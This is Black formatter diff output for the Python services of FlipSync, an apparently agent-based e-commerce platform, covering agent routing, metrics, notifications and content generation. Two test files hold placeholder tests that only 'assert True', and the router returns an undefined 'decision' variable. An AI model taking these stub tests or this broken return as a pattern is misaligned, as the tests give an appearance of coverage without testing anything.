+    async def reject_decision(
+        self, approval_id: str, rejected_by: str, reason: str = None
+    ) -> Dict[str, Any]:
         """Reject a pending decision."""
         try:
             # Update decision status
             if self.agent_repository:
                 await self.agent_repository.update_decision_status(
                     approval_id, "rejected", rejected_by, reason
                 )
-            
+
             return {
                 "status": "rejected",
                 "approval_id": approval_id,
                 "rejected_by": rejected_by,
                 "reason": reason,
-                "timestamp": datetime.now(timezone.utc)
+                "timestamp": datetime.now(timezone.utc),
             }
-            
+
         except Exception as e:
             logger.error(f"Error rejecting decision {approval_id}: {e}")
             raise
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/approval/approval_integration_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/__init__.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/__init__.py	2025-06-19 04:04:05.374042+00:00
@@ -86,14 +86,15 @@
         """Initialize the content generation service."""
         self.market_analyzer = market_analyzer
         self.vector_store = vector_store
 
         # Initialize components
-        self.content_generator = ContentGenerator(
-            market_analyzer=market_analyzer,
-            vector_store=vector_store
-        ) if ContentGenerator and market_analyzer and vector_store else None
+        self.content_generator = (
+            ContentGenerator(market_analyzer=market_analyzer, vector_store=vector_store)
+            if ContentGenerator and market_analyzer and vector_store
+            else None
+        )
 
         self.keyword_optimizer = KeywordOptimizer() if KeywordOptimizer else None
         self.price_optimizer = PriceOptimizer() if PriceOptimizer else None
         self.storytelling_engine = StorytellingEngine() if StorytellingEngine else None
         self.content_optimizer = ContentOptimizer() if ContentOptimizer else None
@@ -101,11 +102,11 @@
     async def generate_optimized_content(
         self,
         product_data: Dict,
         market_trends: Optional[List] = None,
         competitors: Optional[List] = None,
-        category_id: Optional[str] = None
+        category_id: Optional[str] = None,
     ):
         """Generate fully optimized listing content."""
         try:
             if not self.content_generator:
                 raise ValueError("Content generator not properly initialized")
@@ -113,11 +114,11 @@
             # Generate base content
             content = self.content_generator.generate_listing(
                 product_data=product_data,
                 market_trends=market_trends or [],
                 competitors=competitors or [],
-                category_id=category_id or ""
+                category_id=category_id or "",
             )
 
             return content
 
         except Exception as e:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/service.py	2025-06-19 04:04:05.615213+00:00
@@ -18,11 +18,16 @@
 
 from prometheus_client import Counter, Gauge, Histogram
 
 from fs_agt_clean.core.config.manager import ConfigManager
 from fs_agt_clean.core.db.database import Database
-from fs_agt_clean.database.models import Metric, MetricType, MetricSeries, MetricAggregation
+from fs_agt_clean.database.models import (
+    Metric,
+    MetricType,
+    MetricSeries,
+    MetricAggregation,
+)
 from fs_agt_clean.database.repositories.metrics_repository import (
     MetricRepository,
     MetricSeriesRepository,
     MetricAggregationRepository,
 )
@@ -31,13 +36,15 @@
 
 
 class MetricsService:
     """Handles metrics collection and reporting."""
 
-    def __init__(self,
-                 config_manager: Optional[ConfigManager] = None,
-                 database: Optional[Database] = None):
+    def __init__(
+        self,
+        config_manager: Optional[ConfigManager] = None,
+        database: Optional[Database] = None,
+    ):
         """Initialize metrics service.
 
         Args:
             config_manager: Optional configuration manager instance
             database: Optional database instance
@@ -140,11 +147,13 @@
         # Sort labels by key to ensure consistent cache keys
         sorted_labels = sorted(labels.items())
         label_str = ",".join(f"{k}={v}" for k, v in sorted_labels)
         return f"{name}{{{label_str}}}"
 
-    async def _check_aggregation(self, name: str, labels: Optional[Dict] = None) -> None:
+    async def _check_aggregation(
+        self, name: str, labels: Optional[Dict] = None
+    ) -> None:
         """Check if we need to aggregate metrics.
 
         Args:
             name: Metric name
             labels: Optional metric labels
@@ -414,11 +423,13 @@
                 end_time = datetime.utcnow()
             if not start_time:
                 start_time = end_time - timedelta(hours=1)
 
             # Get metrics from database
-            metrics = await self.metric_repository.get_by_time_range(start_time, end_time)
+            metrics = await self.metric_repository.get_by_time_range(
+                start_time, end_time
+            )
 
             # Filter by name if provided
             if names:
                 metrics = [m for m in metrics if m.name in names]
 
@@ -484,11 +495,13 @@
                 end_time = datetime.utcnow()
             if not start_time:
                 start_time = end_time - timedelta(days=7)  # Default to last week
 
             # Get aggregations from database
-            aggregations = await self.metric_aggregation_repository.get_by_time_range(start_time, end_time)
+            aggregations = await self.metric_aggregation_repository.get_by_time_range(
+                start_time, end_time
+            )
 
             # Filter by name if provided
             if names:
                 aggregations = [a for a in aggregations if a.name in names]
 
@@ -554,11 +567,13 @@
                 end_time = datetime.utcnow()
             if not start_time:
                 start_time = end_time - timedelta(hours=24)  # Default to last 24 hours
 
             # Get metrics from database
-            metrics = await self.metric_repository.get_by_time_range(start_time, end_time)
+            metrics = await self.metric_repository.get_by_time_range(
+                start_time, end_time
+            )
 
             # Filter by name
             metrics = [m for m in metrics if m.name == name]
 
             # Filter by component if provided
@@ -594,14 +609,16 @@
             metrics = metrics[:limit]
 
             # Create time series data
             values = []
             for metric in metrics:
-                values.append({
-                    "timestamp": metric.timestamp.isoformat(),
-                    "value": metric.value,
-                })
+                values.append(
+                    {
+                        "timestamp": metric.timestamp.isoformat(),
+                        "value": metric.value,
+                    }
+                )
 
             # Create series object
             series = {
                 "name": name,
                 "values": values,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/communication/agent_router.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/communication/agent_router.py	2025-06-19 04:04:05.626359+00:00
@@ -11,39 +11,45 @@
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass
 from enum import Enum
 
-from fs_agt_clean.services.communication.intent_recognizer import IntentRecognizer, IntentResult
+from fs_agt_clean.services.communication.intent_recognizer import (
+    IntentRecognizer,
+    IntentResult,
+)
 from fs_agt_clean.database.repositories.chat_repository import ChatRepository
 from fs_agt_clean.database.repositories.agent_repository import AgentRepository
 from fs_agt_clean.core.db.database import get_database
 
 logger = logging.getLogger(__name__)
 
 
 class AgentType(str, Enum):
     """Available agent types in the FlipSync system."""
+
     MARKET = "market"
     ANALYTICS = "analytics"
     LOGISTICS = "logistics"
     CONTENT = "content"
     EXECUTIVE = "executive"
     ASSISTANT = "assistant"  # General purpose assistant
 
 
 class AgentStatus(str, Enum):
     """Agent availability status."""
+
     AVAILABLE = "available"
     BUSY = "busy"
     OFFLINE = "offline"
     ERROR = "error"
 
 
 @dataclass
 class RoutingDecision:
     """Result of agent routing decision."""
+
     target_agent: AgentType
     confidence: float
     reasoning: str
     requires_handoff: bool
     handoff_context: Optional[Dict[str, Any]] = None
@@ -52,299 +58,322 @@
 
 
 @dataclass
 class AgentCapability:
     """Defines an agent's capabilities and specializations."""
+
     agent_type: AgentType
     specializations: List[str]
     supported_intents: List[str]
     max_concurrent_conversations: int
     average_response_time: int  # seconds
     availability_hours: Optional[Tuple[int, int]] = None  # (start_hour, end_hour)
 
 
 class AgentRouter:
     """Intelligent agent routing system with load balancing and context awareness."""
-    
+
     def __init__(self, database=None):
         """Initialize the agent router."""
         self.intent_recognizer = IntentRecognizer()
         self.chat_repository = ChatRepository()
         self.agent_repository = AgentRepository()
         self.database = database
-        
+
         # Define agent capabilities
         self.agent_capabilities = {
             AgentType.MARKET: AgentCapability(
                 agent_type=AgentType.MARKET,
                 specializations=[
-                    "pricing_analysis", "inventory_management", "competitor_monitoring",
-                    "marketplace_optimization", "demand_forecasting"
+                    "pricing_analysis",
+                    "inventory_management",
+                    "competitor_monitoring",
+                    "marketplace_optimization",
+                    "demand_forecasting",
                 ],
                 supported_intents=["market_query"],
                 max_concurrent_conversations=5,
-                average_response_time=30
+                average_response_time=30,
             ),
             AgentType.ANALYTICS: AgentCapability(
                 agent_type=AgentType.ANALYTICS,
                 specializations=[
-                    "performance_reporting", "data_visualization", "kpi_tracking",
-                    "trend_analysis", "business_intelligence"
+                    "performance_reporting",
+                    "data_visualization",
+                    "kpi_tracking",
+                    "trend_analysis",
+                    "business_intelligence",
                 ],
                 supported_intents=["analytics_query"],
                 max_concurrent_conversations=3,
-                average_response_time=45
+                average_response_time=45,
             ),
             AgentType.LOGISTICS: AgentCapability(
                 agent_type=AgentType.LOGISTICS,
                 specializations=[
-                    "shipping_optimization", "fulfillment_planning", "carrier_management",
-                    "delivery_tracking", "warehouse_operations"
+                    "shipping_optimization",
+                    "fulfillment_planning",
+                    "carrier_management",
+                    "delivery_tracking",
+                    "warehouse_operations",
                 ],
                 supported_intents=["logistics_query"],
                 max_concurrent_conversations=4,
-                average_response_time=25
+                average_response_time=25,
             ),
             AgentType.CONTENT: AgentCapability(
                 agent_type=AgentType.CONTENT,
                 specializations=[
-                    "listing_optimization", "seo_enhancement", "content_creation",
-                    "image_optimization", "keyword_research"
+                    "listing_optimization",
+                    "seo_enhancement",
+                    "content_creation",
+                    "image_optimization",
+                    "keyword_research",
                 ],
                 supported_intents=["content_query"],
                 max_concurrent_conversations=3,
-                average_response_time=60
+                average_response_time=60,
             ),
             AgentType.EXECUTIVE: AgentCapability(
                 agent_type=AgentType.EXECUTIVE,
                 specializations=[
-                    "strategic_planning", "decision_support", "risk_assessment",
-                    "business_growth", "investment_analysis"
+                    "strategic_planning",
+                    "decision_support",
+                    "risk_assessment",
+                    "business_growth",
+                    "investment_analysis",
                 ],
                 supported_intents=["executive_query"],
                 max_concurrent_conversations=2,
-                average_response_time=90
+                average_response_time=90,
             ),
             AgentType.ASSISTANT: AgentCapability(
                 agent_type=AgentType.ASSISTANT,
                 specializations=[
-                    "general_assistance", "onboarding", "basic_queries",
-                    "system_navigation", "troubleshooting"
+                    "general_assistance",
+                    "onboarding",
+                    "basic_queries",
+                    "system_navigation",
+                    "troubleshooting",
                 ],
                 supported_intents=["general_query"],
                 max_concurrent_conversations=10,
-                average_response_time=15
-            )
+                average_response_time=15,
+            ),
         }
-        
+
         # Track active conversations per agent
         self.active_conversations = {agent_type: set() for agent_type in AgentType}
-        
+
         # Agent status tracking
-        self.agent_status = {agent_type: AgentStatus.AVAILABLE for agent_type in AgentType}
-    
+        self.agent_status = {
+            agent_type: AgentStatus.AVAILABLE for agent_type in AgentType
+        }
+
     async def route_message(
         self,
         message: str,
         user_id: str,
         conversation_id: str,
         conversation_history: Optional[List[Dict]] = None,
-        current_agent: Optional[AgentType] = None
+        current_agent: Optional[AgentType] = None,
     ) -> RoutingDecision:
         """
         Route a message to the most appropriate agent.
-        
+
         Args:
             message: User message content
             user_id: User identifier
             conversation_id: Conversation identifier
             conversation_history: Previous conversation messages
             current_agent: Currently assigned agent (if any)
-            
+
         Returns:
             RoutingDecision with target agent and routing details
         """
         try:
             # Recognize intent
             intent_result = self.intent_recognizer.recognize_intent(
                 message=message,
                 user_id=user_id,
                 conversation_id=conversation_id,
-                conversation_history=conversation_history
-            )
-            
+                conversation_history=conversation_history,
+            )
+
             # Determine target agent based on intent
             target_agent = self._determine_target_agent(intent_result, current_agent)
-            
+
             # Check agent availability and load
             available_agent, routing_confidence = await self._select_available_agent(
                 target_agent, conversation_id
             )
-            
+
             # Determine if handoff is required
             requires_handoff = self._requires_handoff(current_agent, available_agent)
-            
+
             # Prepare handoff context if needed
             handoff_context = None
             if requires_handoff:
                 handoff_context = await self._prepare_handoff_context(
                     conversation_id, current_agent, available_agent, intent_result
                 )
-            
+
             # Generate routing reasoning
             reasoning = self._generate_routing_reasoning(
                 intent_result, target_agent, available_agent, routing_confidence
             )
-            
+
             # Estimate response time
             estimated_response_time = self._estimate_response_time(available_agent)
-            
+
             # Determine fallback agent
             fallback_agent = self._determine_fallback_agent(available_agent)
-            
+
             # Update conversation tracking
             await self._update_conversation_tracking(
                 conversation_id, available_agent, requires_handoff
             )
-            
+
             return RoutingDecision(
                 target_agent=available_agent,
                 confidence=routing_confidence,
                 reasoning=reasoning,
                 requires_handoff=requires_handoff,
                 handoff_context=handoff_context,
                 fallback_agent=fallback_agent,
-                estimated_response_time=estimated_response_time
-            )
-            
+                estimated_response_time=estimated_response_time,
+            )
+
         except Exception as e:
             logger.error(f"Error in agent routing: {e}")
             return RoutingDecision(
                 target_agent=AgentType.ASSISTANT,
                 confidence=0.1,
                 reasoning=f"Error in routing, defaulting to assistant: {e}",
                 requires_handoff=False,
                 fallback_agent=None,
-                estimated_response_time=15
-            )
-    
+                estimated_response_time=15,
+            )
+
     def _determine_target_agent(
-        self, 
-        intent_result: IntentResult, 
-        current_agent: Optional[AgentType]
+        self, intent_result: IntentResult, current_agent: Optional[AgentType]
     ) -> AgentType:
         """Determine the target agent based on intent recognition."""
         # Map intents to agents
         intent_to_agent = {
             "market_query": AgentType.MARKET,
             "analytics_query": AgentType.ANALYTICS,
             "logistics_query": AgentType.LOGISTICS,
             "content_query": AgentType.CONTENT,
             "executive_query": AgentType.EXECUTIVE,
-            "general_query": AgentType.ASSISTANT
+            "general_query": AgentType.ASSISTANT,
         }
-        
+
         # Get primary target
-        target_agent = intent_to_agent.get(intent_result.primary_intent, AgentType.ASSISTANT)
-        
+        target_agent = intent_to_agent.get(
+            intent_result.primary_intent, AgentType.ASSISTANT
+        )
+
         # Consider confidence level
         if intent_result.confidence < 0.5:
             # Low confidence, prefer current agent if available
             if current_agent and current_agent != AgentType.ASSISTANT:
                 return current_agent
             else:
                 return AgentType.ASSISTANT
-        
+
         return target_agent
-    
+
     async def _select_available_agent(
-        self, 
-        target_agent: AgentType, 
-        conversation_id: str
+        self, target_agent: AgentType, conversation_id: str
     ) -> Tuple[AgentType, float]:
         """Select an available agent considering load and status."""
         # Check if target agent is available
         if await self._is_agent_available(target_agent, conversation_id):
             return target_agent, 1.0
-        
+
         # Find alternative agents that can handle the request
         alternative_agents = self._find_alternative_agents(target_agent)
-        
+
         for agent in alternative_agents:
             if await self._is_agent_available(agent, conversation_id):
                 return agent, 0.7  # Lower confidence for alternative
-        
+
         # Fallback to assistant if no specialized agents available
         return AgentType.ASSISTANT, 0.3
-    
-    async def _is_agent_available(self, agent_type: AgentType, conversation_id: str) -> bool:
+
+    async def _is_agent_available(
+        self, agent_type: AgentType, conversation_id: str
+    ) -> bool:
         """Check if an agent is available to handle a new conversation."""
         # Check agent status
         if self.agent_status[agent_type] != AgentStatus.AVAILABLE:
             return False
-        
+
         # Check load capacity
         capability = self.agent_capabilities[agent_type]
         current_load = len(self.active_conversations[agent_type])
-        
+
         # If conversation is already assigned to this agent, it's available
         if conversation_id in self.active_conversations[agent_type]:
             return True
-        
+
         # Check if under capacity
         return current_load < capability.max_concurrent_conversations
-    
+
     def _find_alternative_agents(self, target_agent: AgentType) -> List[AgentType]:
         """Find alternative agents that might handle the request."""
         alternatives = []
-        
+
         # Define agent compatibility matrix
         compatibility = {
             AgentType.MARKET: [AgentType.ANALYTICS, AgentType.EXECUTIVE],
             AgentType.ANALYTICS: [AgentType.MARKET, AgentType.EXECUTIVE],
             AgentType.LOGISTICS: [AgentType.MARKET, AgentType.EXECUTIVE],
             AgentType.CONTENT: [AgentType.MARKET, AgentType.ANALYTICS],
             AgentType.EXECUTIVE: [AgentType.MARKET, AgentType.ANALYTICS],
-            AgentType.ASSISTANT: []  # Assistant doesn't have alternatives
+            AgentType.ASSISTANT: [],  # Assistant doesn't have alternatives
         }
-        
+
         alternatives = compatibility.get(target_agent, [])
-        alternatives.append(AgentType.ASSISTANT)  # Always include assistant as final fallback
-        
+        alternatives.append(
+            AgentType.ASSISTANT
+        )  # Always include assistant as final fallback
+
         return alternatives
-    
+
     def _requires_handoff(
-        self, 
-        current_agent: Optional[AgentType], 
-        target_agent: AgentType
+        self, current_agent: Optional[AgentType], target_agent: AgentType
     ) -> bool:
         """Determine if a handoff between agents is required."""
         if not current_agent:
             return False
-        
+
         return current_agent != target_agent
-    
+
     async def _prepare_handoff_context(
         self,
         conversation_id: str,
         from_agent: Optional[AgentType],
         to_agent: AgentType,
-        intent_result: IntentResult
+        intent_result: IntentResult,
     ) -> Dict[str, Any]:
         """Prepare context information for agent handoff."""
         context = {
             "handoff_timestamp": datetime.now(timezone.utc).isoformat(),
             "from_agent": from_agent.value if from_agent else None,
             "to_agent": to_agent.value,
             "handoff_reason": intent_result.reasoning,
             "intent_confidence": intent_result.confidence,
             "extracted_entities": intent_result.extracted_entities,
-            "conversation_summary": await self._get_conversation_summary(conversation_id)
+            "conversation_summary": await self._get_conversation_summary(
+                conversation_id
+            ),
         }
-        
+
         return context
-    
+
     async def _get_conversation_summary(self, conversation_id: str) -> str:
         """Get a summary of the conversation for handoff context."""
         try:
             if not self.database:
                 logger.warning("Database not available for conversation summary")
@@ -352,86 +381,93 @@
 
             async with self.database.get_session() as session:
                 messages = await self.chat_repository.get_conversation_messages(
                     session, conversation_id, limit=5
                 )
-                
+
                 if not messages:
                     return "No previous conversation history"
-                
+
                 # Create a simple summary
                 summary_parts = []
                 for msg in messages[-3:]:  # Last 3 messages
                     sender = "User" if msg.sender == "user" else "Agent"
-                    content = msg.content[:100] + "..." if len(msg.content) > 100 else msg.content
+                    content = (
+                        msg.content[:100] + "..."
+                        if len(msg.content) > 100
+                        else msg.content
+                    )
                     summary_parts.append(f"{sender}: {content}")
-                
+
                 return " | ".join(summary_parts)
-                
+
         except Exception as e:
             logger.error(f"Error getting conversation summary: {e}")
             return "Error retrieving conversation history"
-    
+
     def _generate_routing_reasoning(
         self,
         intent_result: IntentResult,
         target_agent: AgentType,
         selected_agent: AgentType,
-        confidence: float
+        confidence: float,
     ) -> str:
         """Generate human-readable reasoning for the routing decision."""
         reasoning_parts = []
-        
+
         # Intent-based reasoning
-        reasoning_parts.append(f"Intent: {intent_result.primary_intent} (confidence: {intent_result.confidence:.2f})")
-        
+        reasoning_parts.append(
+            f"Intent: {intent_result.primary_intent} (confidence: {intent_result.confidence:.2f})"
+        )
+
         # Agent selection reasoning
         if target_agent == selected_agent:
             reasoning_parts.append(f"Routed to preferred agent: {selected_agent.value}")
         else:
-            reasoning_parts.append(f"Target agent {target_agent.value} unavailable, using {selected_agent.value}")
-        
+            reasoning_parts.append(
+                f"Target agent {target_agent.value} unavailable, using {selected_agent.value}"
+            )
+
         # Confidence reasoning
         if confidence >= 0.8:
             reasoning_parts.append("High routing confidence")
         elif confidence >= 0.5:
             reasoning_parts.append("Medium routing confidence")
         else:
             reasoning_parts.append("Low routing confidence")
-        
+
         return "; ".join(reasoning_parts)
-    
+
     def _estimate_response_time(self, agent_type: AgentType) -> int:
         """Estimate response time for the selected agent."""
         base_time = self.agent_capabilities[agent_type].average_response_time
-        
+
         # Adjust based on current load
         current_load = len(self.active_conversations[agent_type])
         max_load = self.agent_capabilities[agent_type].max_concurrent_conversations
-        
+
         load_factor = current_load / max_load if max_load > 0 else 0
         adjusted_time = int(base_time * (1 + load_factor))
-        
+
         return adjusted_time
-    
-    def _determine_fallback_agent(self, selected_agent: AgentType) -> Optional[AgentType]:
+
+    def _determine_fallback_agent(
+        self, selected_agent: AgentType
+    ) -> Optional[AgentType]:
         """Determine fallback agent if selected agent becomes unavailable."""
         if selected_agent == AgentType.ASSISTANT:
             return None  # Assistant is the ultimate fallback
-        
+
         return AgentType.ASSISTANT
-    
+
     async def _update_conversation_tracking(
-        self,
-        conversation_id: str,
-        agent_type: AgentType,
-        is_handoff: bool
+        self, conversation_id: str, agent_type: AgentType, is_handoff: bool
     ):
         """Update conversation tracking for load management."""
         # Add conversation to agent's active list
         self.active_conversations[agent_type].add(conversation_id)
-        
+
         # Log the routing decision in database
         try:
             if not self.database:
                 logger.warning("Database not available for logging routing decision")
                 return decision
@@ -443,49 +479,52 @@
                     agent_type=agent_type.value,
                     decision_type="message_routing",
                     parameters={
                         "conversation_id": conversation_id,
                         "is_handoff": is_handoff,
-                        "timestamp": datetime.now(timezone.utc).isoformat()
+                        "timestamp": datetime.now(timezone.utc).isoformat(),
                     },
                     confidence=1.0,
                     rationale=f"Routed conversation {conversation_id} to {agent_type.value}",
-                    requires_approval=False
+                    requires_approval=False,
                 )
         except Exception as e:
             logger.error(f"Error logging routing decision: {e}")
-    
+
     async def release_conversation(self, conversation_id: str, agent_type: AgentType):
         """Release a conversation from an agent's active list."""
         self.active_conversations[agent_type].discard(conversation_id)
-    
+
     def update_agent_status(self, agent_type: AgentType, status: AgentStatus):
         """Update the status of an agent."""
         self.agent_status[agent_type] = status
         logger.info(f"Agent {agent_type.value} status updated to {status.value}")
-    
+
     def get_routing_statistics(self) -> Dict[str, Any]:
         """Get routing statistics and agent load information."""
         stats = {
-            "agent_status": {agent.value: status.value for agent, status in self.agent_status.items()},
+            "agent_status": {
+                agent.value: status.value for agent, status in self.agent_status.items()
+            },
             "active_conversations": {
-                agent.value: len(conversations) 
+                agent.value: len(conversations)
                 for agent, conversations in self.active_conversations.items()
             },
             "agent_capabilities": {
                 agent.value: {
                     "max_concurrent": cap.max_concurrent_conversations,
                     "avg_response_time": cap.average_response_time,
-                    "specializations": cap.specializations
+                    "specializations": cap.specializations,
                 }
                 for agent, cap in self.agent_capabilities.items()
             },
             "load_percentages": {
                 agent.value: (
-                    len(self.active_conversations[agent]) / 
-                    self.agent_capabilities[agent].max_concurrent_conversations * 100
+                    len(self.active_conversations[agent])
+                    / self.agent_capabilities[agent].max_concurrent_conversations
+                    * 100
                 )
                 for agent in AgentType
-            }
+            },
         }
-        
+
         return stats
--- /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/test_keyword_optimizer.py	2025-06-14 20:35:30.827822+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/test_keyword_optimizer.py	2025-06-19 04:04:05.642941+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestKeywordOptimizerService:
     """Test class for keyword_optimizer service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/communication/agent_router.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/test_keyword_optimizer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/conversational/__init__.py	2025-06-14 20:35:30.827822+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/conversational/__init__.py	2025-06-19 04:04:05.664094+00:00
@@ -9,14 +9,14 @@
 
 from .optimization_service import (
     ConversationalOptimizationService,
     OptimizationFocus,
     OptimizationResult,
-    conversational_optimization_service
+    conversational_optimization_service,
 )
 
 __all__ = [
     "ConversationalOptimizationService",
-    "OptimizationFocus", 
+    "OptimizationFocus",
     "OptimizationResult",
-    "conversational_optimization_service"
+    "conversational_optimization_service",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/conversational/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/data_processing/test_validators.py	2025-06-14 20:35:30.827822+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/data_processing/test_validators.py	2025-06-19 04:04:05.900280+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestValidatorsService:
     """Test class for validators service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/data_processing/test_validators.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/communication/recommendation_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/communication/recommendation_service.py	2025-06-19 04:04:05.902222+00:00
@@ -6,12 +6,16 @@
 
 import logging
 from typing import Any, Dict, List, Optional
 
 from fs_agt_clean.core.models.recommendation import ChatRecommendationContext
-from fs_agt_clean.core.recommendations.algorithms.collaborative import CollaborativeFiltering
-from fs_agt_clean.core.recommendations.algorithms.content_based import ContentBasedFiltering
+from fs_agt_clean.core.recommendations.algorithms.collaborative import (
+    CollaborativeFiltering,
+)
+from fs_agt_clean.core.recommendations.algorithms.content_based import (
+    ContentBasedFiltering,
+)
 from fs_agt_clean.core.recommendations.algorithms.hybrid import (
     HybridRecommender,
     Recommendation,
 )
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/communication/recommendation_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/content_generator.py	2025-06-14 20:35:30.827822+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/content_generator.py	2025-06-19 04:04:05.948406+00:00
@@ -8,11 +8,15 @@
 from typing import Dict, List, Optional, Tuple
 
 import numpy as np
 
 from fs_agt_clean.core.models.vector_store.store import VectorStore
-from fs_agt_clean.services.market_analysis import CompetitorProfile, MarketAnalyzer, TrendData
+from fs_agt_clean.services.market_analysis import (
+    CompetitorProfile,
+    MarketAnalyzer,
+    TrendData,
+)
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/content_generation/content_generator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/communication/service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/communication/service.py	2025-06-19 04:04:06.040267+00:00
@@ -20,11 +20,13 @@
 from fs_agt_clean.core.notifications.device_manager import DeviceManager
 from fs_agt_clean.database.models import Notification as DbNotification
 from fs_agt_clean.database.models import NotificationCategory as DbNotificationCategory
 from fs_agt_clean.database.models import NotificationPriority as DbNotificationPriority
 from fs_agt_clean.database.models import NotificationStatus as DbNotificationStatus
-from fs_agt_clean.database.repositories.notification_repository import NotificationRepository
+from fs_agt_clean.database.repositories.notification_repository import (
+    NotificationRepository,
+)
 from fs_agt_clean.services.metrics.service import MetricsService
 from fs_agt_clean.services.notifications.email_service import EmailService
 from fs_agt_clean.services.notifications.push_service import PushService
 from fs_agt_clean.services.notifications.templates.base import NotificationTemplate
 
@@ -430,11 +432,13 @@
         Returns:
             Optional[str]: Status if found
         """
         try:
             # Try to get from database first
-            notification = await self.notification_repository.find_by_id(notification_id)
+            notification = await self.notification_repository.find_by_id(
+                notification_id
+            )
             if notification:
                 return notification.status.value
 
             # Fall back to in-memory tracking for backward compatibility
             if notification_id in self._delivered:
@@ -464,19 +468,24 @@
         Returns:
             bool: True if retry was successful
         """
         try:
             # Try to get from database first
-            notification_db = await self.notification_repository.find_by_id(notification_id)
-            if notification_db and notification_db.status == DbNotificationStatus.FAILED:
+            notification_db = await self.notification_repository.find_by_id(
+                notification_id
+            )
+            if (
+                notification_db
+                and notification_db.status == DbNotificationStatus.FAILED
+            ):
                 # Reset delivery attempts in database
                 await self.notification_repository.update(
                     notification_id,
                     {
                         "status": DbNotificationStatus.PENDING,
                         "delivery_attempts": {},
-                    }
+                    },
                 )
 
                 # Check if we have in-memory tracking for this notification
                 if notification_id in self._failed:
                     notification = self._failed.pop(notification_id)
@@ -485,14 +494,24 @@
                 else:
                     # Create in-memory tracking for backward compatibility
                     self._pending[notification_id] = {
                         "user_id": notification_db.user_id,
                         "template_id": notification_db.template_id,
-                        "category": notification_db.category.value if notification_db.category else None,
+                        "category": (
+                            notification_db.category.value
+                            if notification_db.category
+                            else None
+                        ),
                         "data": notification_db.data or {},
-                        "priority": notification_db.priority.value if notification_db.priority else NotificationPriority.MEDIUM,
-                        "delivery_methods": set(notification_db.delivery_methods or ["push", "email"]),
+                        "priority": (
+                            notification_db.priority.value
+                            if notification_db.priority
+                            else NotificationPriority.MEDIUM
+                        ),
+                        "delivery_methods": set(
+                            notification_db.delivery_methods or ["push", "email"]
+                        ),
                         "attempts": 0,
                         "created_at": notification_db.created_at,
                         "db_notification": notification_db,
                     }
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/communication/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/dashboard/service.py	2025-06-14 20:35:30.827822+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/dashboard/service.py	2025-06-19 04:04:06.093559+00:00
@@ -39,16 +39,17 @@
                 if self.config_manager:
                     self.database = Database(self.config_manager)
                 else:
                     # Use default database configuration
                     from fs_agt_clean.core.db.database import get_database
+
                     self.database = get_database()
 
             # Ensure database is connected
-            if hasattr(self.database, 'create_tables'):
+            if hasattr(self.database, "create_tables"):
                 await self.database.create_tables()
-            
+
             self._initialized = True
             logger.info("Dashboard service initialized successfully")
         except Exception as e:
             logger.error(f"Failed to initialize dashboard service: {e}")
             raise
@@ -64,23 +65,25 @@
         """
         if not self._initialized:
             await self.initialize()
 
         # For now, return a mock dashboard since we don't have the full repository
-        dashboard_id = dashboard_data.get('id', f"dashboard_{datetime.now().timestamp()}")
-        
+        dashboard_id = dashboard_data.get(
+            "id", f"dashboard_{datetime.now().timestamp()}"
+        )
+
         created_dashboard = {
             "id": dashboard_id,
             "name": dashboard_data.get("name", "New Dashboard"),
             "description": dashboard_data.get("description", ""),
             "config": dashboard_data.get("config", {}),
             "user_id": dashboard_data.get("user_id"),
             "is_public": dashboard_data.get("is_public", False),
